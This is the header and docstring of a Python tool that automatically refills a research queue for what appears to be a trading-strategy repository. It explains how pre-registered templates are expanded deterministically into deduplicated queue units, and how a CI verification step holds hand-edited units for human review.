#!/usr/bin/env python3
# wiring: .github/workflows/research-queue-replenish.yml (cron + dispatch); scripts/ci/check_pr_landing.py --verify
"""Keep the research queue full WITHOUT a session: expand pre-registered
template families into concrete queue units, deduped, deterministic.

WHY THIS EXISTS (operator, 2026-09-28, relayed by the manager)
---------------------------------------------------------------
*"The research queue should be running 24/7 with or without Claude, we need
to make sure the queue has enough tests to run and keep replenishing it."*
Until this file the queue was refilled only when a session wrote a unit by
hand -- so every token-capped day was a day the runners sat idle once the
hand-written units had run.

WHAT IT DOES
------------
  1. Reads `research/templates/*.yaml` -- one FAMILY each. A family fixes the
     question, decision rule, power block, cost stack, runner and inputs BEFORE
     any unit exists; the only thing a unit adds is the parameter point
     (leg / symbol x timeframe / geometry / sizing arm).
  2. Expands each family's `grid:` against the repo's committed facts
     (config/strategies.yaml legs, config/accounts.yaml rosters,
     comms/strategy_evidence/<leg>.json records) into candidate units, each
     with a deterministic `generated.key`.
  3. Dedupes: a key that already exists in ANY unit under research/queue/
     (queued, done, blocked, retired) is never generated twice. Recurring
     cadences live on the unit itself (the dispatcher re-fires weekly/monthly
     units), so one unit per key is enough to keep re-asking.
  4. Fills the deficit to `--target` runnable units by the families'
     `weight:` (largest-remainder allocation over the deficit, so 30/25/20/15/10
     is honoured across runs, not just once), taking candidates in sorted key
     order. Ids continue `RQ-<date>-NNN` from the highest NNN already used
     that day.

DETERMINISM IS THE SAFETY PROPERTY. A generated unit self-lands only because
`scripts/ci/check_pr_landing.py` can re-run `--verify` at the PR's merge-base
and get the SAME BYTES from the committed templates and the params the unit
records under `generated.params`. Anything a session or a bot hand-edits into a
generated unit no longer reproduces and therefore holds for a human -- which
is exactly the E57 property (a pre-registered rule may not be rewritten in
the same act that lands it) extended to units nobody wrote by hand.

Every unit carries `decision_rule.registered_before_run: true` because the
template that produced it was committed before the run by construction, and
the rule id embeds the family + parameter point so a result can only be
matched to the rule registered for that point.

Tier-1 research tooling: reads config + committed evidence, writes only
research/queue/RQ-*.yaml. Never touches config/, src/ or a live path.
"""
